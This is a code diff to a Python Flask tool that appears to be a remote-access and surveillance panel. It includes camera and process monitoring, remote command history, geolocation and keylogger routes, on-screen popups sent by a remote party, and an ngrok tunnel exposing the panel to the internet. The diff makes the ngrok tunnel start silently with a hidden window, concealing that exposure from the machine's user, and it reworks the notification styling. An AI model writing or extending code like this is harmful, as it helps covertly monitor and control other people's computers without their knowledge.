@@ -20,6 +20,7 @@ import platform
 import sys
 import geocoder
 
+
 # Configuration file path
 CONFIG_FILE = "seeker_config.json"
 
@@ -281,31 +282,6 @@ class SecureJetsuMailer:
         # Verify email configuration
         if not all([self.sender_email, self.sender_password, self.receiver_email]):
             raise ValueError("Email configuration incomplete. Check seeker_config.json")
-    
-    def _to_jetsu(self, text):
-        """Encode message using Jetsu"""
-        m = {}
-        for i in range(65, 91):
-            m[chr(i)] = 261 + (i - 65)
-        for i in range(97, 123):
-            m[chr(i)] = 261 + (i - 97)
-        m.update({'@': 69, '.': 6969, ' ': 666666})
-        return ' '.join(str(m.get(c, c)) for c in text)
-    
-    def _from_jetsu(self, encoded_text):
-        """Decode Jetsu message"""
-        m = {}
-        for i in range(65, 91):
-            m[261 + (i - 65)] = chr(i).lower()
-        m.update({69: '@', 6969: '.', 666666: ' '})
-        
-        result = []
-        for code in encoded_text.split():
-            try:
-                result.append(m.get(int(code), code))
-            except:
-                result.append(code)
-        return ''.join(result)
     
     def send(self, subject, message):
         """Send readable email using configured credentials"""
@@ -986,30 +962,40 @@ class NgrokManager:
         self.public_url = None
         
     def start_ngrok(self):
-        """Start ngrok tunnel"""
+        """Start ngrok tunnel silently without showing command prompt"""
         try:
             # Check if ngrok is installed
-            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
+            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True, shell=True)
             if result.returncode != 0:
                 print("❌ Ngrok is not installed. Please install ngrok first:")
                 print("   Visit: https://ngrok.com/download")
                 print("   Or install via pip: pip install pyngrok")
                 return False
             
-            # Start ngrok tunnel
+            # Start ngrok in background with hidden window
             if NGROK_AUTH_TOKEN:
-                subprocess.run(['ngrok', 'authtoken', NGROK_AUTH_TOKEN], capture_output=True)
+                subprocess.run(['ngrok', 'authtoken', NGROK_AUTH_TOKEN], capture_output=True, shell=True)
             
-            # Start ngrok in background
+            # Platform-specific startup info to hide the window
+            startupinfo = None
+            if platform.system() == "Windows":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0  # SW_HIDE
+            
+            # Start ngrok with hidden window
             self.process = subprocess.Popen(
                 ['ngrok', 'http', str(self.port)],
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
-                text=True
+                stdin=subprocess.PIPE,
+                text=True,
+                startupinfo=startupinfo,
+                creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
             )
             
             # Wait for ngrok to start and get URL
-            time.sleep(3)
+            time.sleep(5)  # Give more time for ngrok to initialize
             self.public_url = self.get_ngrok_url()
             
             if self.public_url:
@@ -1025,22 +1011,29 @@ class NgrokManager:
     
     def get_ngrok_url(self):
         """Get the public ngrok URL"""
-        try:
-            response = requests.get('http://localhost:4040/api/tunnels')
-            if response.status_code == 200:
-                tunnels = response.json()['tunnels']
-                for tunnel in tunnels:
-                    if tunnel['proto'] == 'https':
-                        return tunnel['public_url']
-            return None
-        except:
-            return None
+        max_retries = 10
+        for i in range(max_retries):
+            try:
+                response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
+                if response.status_code == 200:
+                    tunnels = response.json()['tunnels']
+                    for tunnel in tunnels:
+                        if tunnel['proto'] == 'https':
+                            return tunnel['public_url']
+                time.sleep(1)  # Wait before retry
+            except:
+                time.sleep(1)  # Wait before retry
+                continue
+        return None
     
     def stop_ngrok(self):
         """Stop ngrok tunnel"""
         if self.process:
             self.process.terminate()
-            self.process.wait()
+            try:
+                self.process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                self.process.kill()
             print("🔒 Ngrok tunnel stopped")
 
 class SystemMonitor:
@@ -1142,239 +1135,458 @@ class UniversalPopupManager:
             try:
                 message_data = popup_queue.get(timeout=1.0)
                 self._show_universal_notification(message_data['message'], message_data['sender'])
+                popup_queue.task_done()
             except queue.Empty:
                 continue
             except Exception as e:
                 print(f"Popup worker error: {e}")
     
     def _show_universal_notification(self, message, sender):
-        """Try multiple methods to show notification"""
+        """Try multiple methods to show notification in lower-right corner"""
         print(f"🔔 Attempting to show notification from {sender}: {message}")
         
-        # Method 1: Try Windows Toast (most reliable on Windows 10/11)
-        if self._try_windows_toast(message, sender):
+        # Method 1: Try modern browser-based notification
+        if self._try_browser_notification(message, sender):
             return
             
-        # Method 2: Try tkinter simple
-        if self._try_tkinter_simple(message, sender):
+        # Method 2: Try tkinter with custom positioning
+        if self._try_tkinter_custom(message, sender):
             return
             
-        # Method 3: Try platform-specific methods
-        if self._try_platform_specific(message, sender):
-            return
-            
-        # Method 4: Ultimate fallback
+        # Method 3: Ultimate fallback
         self._ultimate_fallback(message, sender)
     
-    def _try_windows_toast(self, message, sender):
-        """Try Windows toast notifications"""
+    def _try_browser_notification(self, message, sender):
+        """Try modern browser-based notification with cool effects"""
         try:
-            # First try win10toast
-            from win10toast import ToastNotifier
-            toaster = ToastNotifier()
-            toaster.show_toast(
-                f"💬 {sender}",
-                message,
-                duration=5,
-                threaded=True
-            )
-            print("✅ Used Windows toast notification")
-            return True
-        except ImportError:
-            print("ℹ️ win10toast not installed")
-        except Exception as e:
-            print(f"❌ Windows toast failed: {e}")
+            # Create HTML file with cool notification
+            html_content = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>💬 {sender}</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
         
-        # Try alternative Windows method
-        try:
-            if platform.system().lower() == "windows":
-                # Use powershell for notification
-                ps_script = f'''
-                Add-Type -AssemblyName System.Windows.Forms
-                $global:balloon = New-Object System.Windows.Forms.NotifyIcon
-                $path = Get-Process -id $pid | Select-Object -ExpandProperty Path
-                $balloon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
-                $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
-                $balloon.BalloonTipText = "{message}"
-                $balloon.BalloonTipTitle = "💬 {sender}"
-                $balloon.Visible = $true
-                $balloon.ShowBalloonTip(5000)
-                '''
-                result = subprocess.run(['powershell', '-Command', ps_script], 
-                                      capture_output=True, text=True, timeout=10)
-                if result.returncode == 0:
-                    print("✅ Used PowerShell notification")
-                    return True
-        except Exception as e:
-            print(f"❌ PowerShell notification failed: {e}")
-            
-        return False
-    
-    def _try_tkinter_simple(self, message, sender):
-        """Try simple tkinter messagebox"""
-        try:
-            import tkinter as tk
-            from tkinter import messagebox
-            
-            # Create and immediately hide the root window
-            root = tk.Tk()
-            root.withdraw()
-            root.attributes('-topmost', True)
-            
-            # Show messagebox (this should work on most systems)
-            messagebox.showinfo(f"💬 {sender}", message)
-            
-            # Clean up
-            root.destroy()
-            print("✅ Used tkinter messagebox")
-            return True
-        except Exception as e:
-            print(f"❌ Tkinter simple failed: {e}")
-            return False
-    
-    def _try_platform_specific(self, message, sender):
-        """Try platform-specific notification methods"""
-        system_name = platform.system().lower()
+        * {{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }}
         
-        if system_name == "windows":
-            return self._try_windows_specific(message, sender)
-        elif system_name == "darwin":  # macOS
-            return self._try_macos_specific(message, sender)
-        elif system_name == "linux":
-            return self._try_linux_specific(message, sender)
+        body {{
+            font-family: 'Poppins', sans-serif;
+            background: transparent;
+            overflow: hidden;
+        }}
         
-        return False
-    
-    def _try_windows_specific(self, message, sender):
-        """Windows-specific notification methods"""
-        try:
-            # Method: Use ctypes for simple message box
-            import ctypes
-            ctypes.windll.user32.MessageBoxW(0, message, f"💬 {sender}", 0x40 | 0x1000)
-            print("✅ Used ctypes messagebox")
-            return True
-        except Exception as e:
-            print(f"❌ ctypes messagebox failed: {e}")
+        .notification-container {{
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 350px;
+            z-index: 999999;
+        }}
         
-        return False
-    
-    def _try_macos_specific(self, message, sender):
-        """macOS-specific notification methods"""
-        try:
-            script = f'display notification "{message}" with title "💬 {sender}" sound name "Glass"'
-            subprocess.run(['osascript', '-e', script], check=True)
-            print("✅ Used macOS notification")
-            return True
-        except Exception as e:
-            print(f"❌ macOS notification failed: {e}")
-            return False
-    
-    def _try_linux_specific(self, message, sender):
-        """Linux-specific notification methods"""
-        try:
-            # Try notify-send
-            subprocess.run(['notify-send', f'💬 {sender}', message], check=True)
-            print("✅ Used Linux notify-send")
-            return True
-        except Exception as e:
-            print(f"❌ Linux notify-send failed: {e}")
-            
-        try:
-            # Try zenity
-            subprocess.run(['zenity', '--info', '--text', message, '--title', f'💬 {sender}'], 
-                         check=True)
-            print("✅ Used Linux zenity")
-            return True
-        except Exception as e:
-            print(f"❌ Linux zenity failed: {e}")
-            
-        return False
-    
-    def _ultimate_fallback(self, message, sender):
-        """Ultimate fallback - always works"""
-        try:
-            # Create a simple HTML file and open it in browser
-            html_content = f"""
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>💬 {sender}</title>
-                <style>
-                    body {{
-                        font-family: Arial, sans-serif;
-                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                        margin: 0;
-                        padding: 20px;
-                        color: white;
-                        text-align: center;
-                        height: 100vh;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                    }}
-                    .notification {{
-                        background: rgba(255,255,255,0.1);
-                        backdrop-filter: blur(10px);
-                        border-radius: 15px;
-                        padding: 30px;
-                        max-width: 400px;
-                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-                        border: 1px solid rgba(255,255,255,0.2);
-                    }}
-                    .sender {{
-                        font-size: 24px;
-                        font-weight: bold;
-                        margin-bottom: 15px;
-                        color: #ffd700;
-                    }}
-                    .message {{
-                        font-size: 18px;
-                        line-height: 1.5;
-                        margin-bottom: 20px;
-                    }}
-                    .time {{
-                        font-size: 12px;
-                        color: #ccc;
-                    }}
-                </style>
-                <script>
-                    // Auto-close after 5 seconds
-                    setTimeout(function() {{
-                        window.close();
-                    }}, 5000);
-                    
-                    // Also allow clicking to close
-                    document.addEventListener('click', function() {{
-                        window.close();
-                    }});
-                </script>
-            </head>
-            <body>
-                <div class="notification">
-                    <div class="sender">💬 {sender}</div>
-                    <div class="message">{message}</div>
-                    <div class="time">Click anywhere or wait 5 seconds to close...</div>
+        .notification {{
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+            transform: translateX(400px);
+            opacity: 0;
+            animation: slideIn 0.5s forwards, glow 2s infinite alternate;
+            position: relative;
+            overflow: hidden;
+        }}
+        
+        .notification::before {{
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #ff7e5f, #feb47b, #86a8e7, #91eae4);
+            animation: rainbow 3s linear infinite;
+        }}
+        
+        .notification-header {{
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }}
+        
+        .notification-icon {{
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-size: 20px;
+            animation: bounce 2s infinite;
+        }}
+        
+        .notification-title {{
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            display: flex;
+            align-items: center;
+        }}
+        
+        .sender-badge {{
+            background: rgba(255,255,255,0.3);
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            margin-left: 8px;
+            font-weight: 500;
+        }}
+        
+        .notification-body {{
+            color: rgba(255,255,255,0.9);
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }}
+        
+        .notification-footer {{
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: rgba(255,255,255,0.7);
+        }}
+        
+        .notification-time {{
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }}
+        
+        .close-btn {{
+            background: rgba(255,255,255,0.2);
+            border: none;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s;
+        }}
+        
+        .close-btn:hover {{
+            background: rgba(255,255,255,0.3);
+            transform: scale(1.05);
+        }}
+        
+        @keyframes slideIn {{
+            to {{
+                transform: translateX(0);
+                opacity: 1;
+            }}
+        }}
+        
+        @keyframes glow {{
+            from {{
+                box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            }}
+            to {{
+                box-shadow: 0 10px 40px rgba(118, 75, 162, 0.6);
+            }}
+        }}
+        
+        @keyframes rainbow {{
+            0% {{ background-position: 0% 50%; }}
+            50% {{ background-position: 100% 50%; }}
+            100% {{ background-position: 0% 50%; }}
+        }}
+        
+        @keyframes bounce {{
+            0%, 100% {{ transform: translateY(0); }}
+            50% {{ transform: translateY(-5px); }}
+        }}
+        
+        @keyframes fadeOut {{
+            to {{
+                opacity: 0;
+                transform: translateX(400px);
+            }}
+        }}
+    </style>
+</head>
+<body>
+    <div class="notification-container">
+        <div class="notification" id="notification">
+            <div class="notification-header">
+                <div class="notification-icon">💬</div>
+                <div class="notification-title">
+                    New Message
+                    <span class="sender-badge">From: {sender}</span>
                 </div>
-            </body>
-            </html>
-            """
+            </div>
+            <div class="notification-body">
+                {message}
+            </div>
+            <div class="notification-footer">
+                <div class="notification-time">
+                    <span>🕐</span>
+                    <span>{datetime.now().strftime("%H:%M:%S")}</span>
+                </div>
+                <button class="close-btn" onclick="closeNotification()">Dismiss</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Auto-close after 8 seconds
+        setTimeout(function() {{
+            closeNotification();
+        }}, 8000);
+        
+        function closeNotification() {{
+            const notification = document.getElementById('notification');
+            notification.style.animation = 'fadeOut 0.5s forwards';
+            setTimeout(function() {{
+                window.close();
+            }}, 500);
+        }}
+        
+        // Click anywhere to close
+        document.addEventListener('click', function() {{
+            closeNotification();
+        }});
+        
+        // Add hover effect
+        const notification = document.getElementById('notification');
+        notification.addEventListener('mouseenter', function() {{
+            this.style.transform = 'scale(1.02)';
+        }});
+        notification.addEventListener('mouseleave', function() {{
+            this.style.transform = 'scale(1)';
+        }});
+        
+        // Position window in lower right corner
+        window.moveTo(screen.width - 390, screen.height - 250);
+        window.resizeTo(390, 200);
+    </script>
+</body>
+</html>"""
             
             # Save HTML to temporary file
-            temp_file = "temp_notification.html"
-            with open(temp_file, "w", encoding="utf-8") as f:
-                f.write(html_content)
+            import tempfile
+            temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8')
+            temp_file.write(html_content)
+            temp_file.close()
             
             # Open in browser
-            webbrowser.open(f"file://{os.path.abspath(temp_file)}")
+            webbrowser.open(f"file://{temp_file.name}")
             
             # Schedule file deletion
-            threading.Timer(10, lambda: os.remove(temp_file) if os.path.exists(temp_file) else None).start()
+            threading.Timer(15, lambda: os.unlink(temp_file.name) if os.path.exists(temp_file.name) else None).start()
             
-            print("✅ Used browser fallback notification")
+            print("✅ Used modern browser notification with effects")
+            return True
+                
+        except Exception as e:
+            print(f"❌ Browser notification failed: {e}")
+            return False
+    
+    def _try_tkinter_custom(self, message, sender):
+        """Try tkinter with custom positioning in lower right corner"""
+        try:
+            import tkinter as tk
+            from tkinter import font as tkfont
+            
+            # Create root window
+            root = tk.Tk()
+            root.title(f"💬 {sender}")
+            
+            # Remove window decorations
+            root.overrideredirect(True)
+            
+            # Make window always on top
+            root.attributes('-topmost', True)
+            
+            # Set window size and position (lower right corner)
+            window_width = 350
+            window_height = 150
+            
+            # Get screen dimensions
+            screen_width = root.winfo_screenwidth()
+            screen_height = root.winfo_screenheight()
+            
+            # Calculate position (lower right corner with some margin)
+            x_position = screen_width - window_width - 20
+            y_position = screen_height - window_height - 50
+            
+            root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
+            
+            # Create gradient background
+            canvas = tk.Canvas(root, width=window_width, height=window_height, highlightthickness=0)
+            canvas.pack(fill="both", expand=True)
+            
+            # Draw gradient background
+            for i in range(window_height):
+                # Create gradient from purple to blue
+                r = int(102 + (118-102)*i/window_height)
+                g = int(126 + (75-126)*i/window_height)
+                b = int(234 + (162-234)*i/window_height)
+                color = f'#{r:02x}{g:02x}{b:02x}'
+                canvas.create_line(0, i, window_width, i, fill=color)
+            
+            # Add message text
+            custom_font = tkfont.Font(family="Segoe UI", size=11)
+            text = canvas.create_text(20, 40, text=message, font=custom_font, 
+                                     fill="white", anchor="nw", width=310)
+            
+            # Add sender info
+            sender_text = canvas.create_text(20, 15, text=f"From: {sender}", 
+                                           font=("Segoe UI", 10, "bold"), 
+                                           fill="#ffd700", anchor="nw")
+            
+            # Add time
+            time_text = canvas.create_text(20, window_height - 30, 
+                                         text=datetime.now().strftime("%H:%M:%S"), 
+                                         font=("Segoe UI", 9), fill="#cccccc", anchor="nw")
+            
+            # Add close button
+            close_btn = tk.Button(root, text="✕", command=root.destroy, 
+                                 bg="#4a4a4a", fg="white",
+                                 bd=0, font=("Arial", 10, "bold"),
+                                 activebackground="#6a6a6a")
+            close_btn.place(x=window_width-30, y=5, width=25, height=25)
+            
+            # Add hover effect
+            def on_enter(e):
+                root.attributes('-alpha', 0.95)
+            
+            def on_leave(e):
+                root.attributes('-alpha', 1.0)
+            
+            root.bind("<Enter>", on_enter)
+            root.bind("<Leave>", on_leave)
+            
+            # Auto-close after 8 seconds
+            root.after(8000, root.destroy)
+            
+            # Make window clickable to close
+            def close_on_click(event):
+                root.destroy()
+            
+            canvas.bind("<Button-1>", close_on_click)
+            
+            # Add animation (fade in)
+            root.attributes('-alpha', 0.0)
+            def fade_in():
+                alpha = root.attributes('-alpha')
+                if alpha < 1.0:
+                    root.attributes('-alpha', alpha + 0.1)
+                    root.after(30, fade_in)
+            
+            fade_in()
+            
+            # Start the tkinter main loop in a separate thread
+            def run_tkinter():
+                try:
+                    root.mainloop()
+                except:
+                    pass
+            
+            tk_thread = threading.Thread(target=run_tkinter, daemon=True)
+            tk_thread.start()
+            
+            print("✅ Used tkinter custom notification")
+            return True
+        except Exception as e:
+            print(f"❌ Tkinter custom failed: {e}")
+            return False
+    
+    def _ultimate_fallback(self, message, sender):
+        """Ultimate fallback - simple but effective"""
+        try:
+            # Create simple HTML notification
+            html_content = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>💬 {sender}</title>
+    <style>
+        body {{
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: Arial, sans-serif;
+            color: white;
+        }}
+        .notification {{
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 300px;
+            background: rgba(0,0,0,0.3);
+            backdrop-filter: blur(10px);
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+        }}
+        .sender {{
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #ffd700;
+        }}
+        .message {{
+            margin-bottom: 10px;
+        }}
+        .time {{
+            font-size: 12px;
+            color: #ccc;
+            text-align: right;
+        }}
+    </style>
+    <script>
+        setTimeout(function() {{
+            window.close();
+        }}, 5000);
+        
+        document.addEventListener('click', function() {{
+            window.close();
+        }});
+        
+        // Position in lower right
+        window.moveTo(screen.width - 340, screen.height - 200);
+        window.resizeTo(340, 150);
+    </script>
+</head>
+<body>
+    <div class="notification">
+        <div class="sender">💬 {sender}</div>
+        <div class="message">{message}</div>
+        <div class="time">{datetime.now().strftime("%H:%M:%S")}</div>
+    </div>
+</body>
+</html>"""
+            
+            import tempfile
+            temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8')
+            temp_file.write(html_content)
+            temp_file.close()
+            
+            webbrowser.open(f"file://{temp_file.name}")
+            
+            threading.Timer(10, lambda: os.unlink(temp_file.name) if os.path.exists(temp_file.name) else None).start()
+            
+            print("✅ Used ultimate fallback notification")
             return True
             
         except Exception as e:
-            print(f"❌ Browser fallback failed: {e}")
+            print(f"❌ Ultimate fallback failed: {e}")
             # Final console fallback
             self._console_notification(message, sender)
             return False
@@ -1392,14 +1604,13 @@ class UniversalPopupManager:
         # Try to make a sound
         try:
             import winsound
-            winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
-            # Beep sequence for attention
-            for i in range(3):
-                winsound.Beep(1000, 200)
-                time.sleep(0.1)
+            # Play a notification sound
+            for freq in [1000, 1200, 1000]:
+                winsound.Beep(freq, 200)
+                time.sleep(0.05)
         except:
             # Console beep as fallback
-            print('\a\a\a')  # System beep
+            print('\a' * 3)
 
 # Initialize managers
 camera_manager = CameraManager()
@@ -1510,12 +1721,42 @@ def index():
                 color: var(--light);
                 min-height: 100vh;
                 line-height: 1.6;
+                display: flex;
+                flex-direction: column;
             }}
 
             .container {{
                 max-width: 1400px;
                 margin: 0 auto;
                 padding: 20px;
+                flex: 1;
+            }}
+
+            /* Footer Styles */
+            .footer {{
+                background: rgba(0, 0, 0, 0.3);
+                backdrop-filter: blur(20px);
+                border-top: 1px solid var(--border);
+                padding: 20px;
+                text-align: center;
+                margin-top: 40px;
+            }}
+
+            .footer-content {{
+                max-width: 1400px;
+                margin: 0 auto;
+                color: var(--gray);
+                font-size: 0.9rem;
+            }}
+
+            .footer a {{
+                color: var(--primary);
+                text-decoration: none;
+            }}
+
+            .footer a:hover {{
+                color: var(--secondary);
+                text-decoration: underline;
             }}
 
             /* Header Styles */
@@ -2068,7 +2309,7 @@ def index():
                     <button class="btn btn-primary" onclick="copyToClipboard('http://{local_ip}:{PORT}')">
                         📋 Copy Local URL
                     </button>
-                    <button class="btn btn-secondary" onclick="copyToClipboard('{ngrok_manager.public_url or ''}')" {'' if ngrok_manager.public_url else 'disabled'}>
+                    <button class="btn btn-secondary" onclick="copyToClipboard('{ngrok_manager.public_url or ""}')" {'disabled' if not ngrok_manager.public_url else ''}>
                         🌐 Copy Public URL
                     </button>
                 </div>
@@ -2244,6 +2485,13 @@ def index():
                         Loading processes...
                     </div>
                 </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-content">
+                © 2025 All Rights Reserved. Created by 3dm4rk
             </div>
         </div>
 
@@ -2754,7 +3002,8 @@ def send_message():
         sender = data.get('sender', 'Anonymous')
         
         if message:
-            show_popup_notification(message, sender)
+            # Show popup notification
+            success = show_popup_notification(message, sender)
             
             # Add to chat history
             chat_messages_deque.append({
@@ -2764,7 +3013,7 @@ def send_message():
                 'type': 'remote'
             })
             
-            return jsonify({'success': True})
+            return jsonify({'success': success})
         else:
             return jsonify({'success': False, 'error': 'Empty message'})
     except Exception as e:
@@ -2825,7 +3074,6 @@ def get_command_history():
     history = list(command_history)
     return jsonify({'history': history})
 
-# New routes for geolocation and keylogger
 @app.route('/geolocation')
 def get_geolocation():
     """Get geolocation data"""
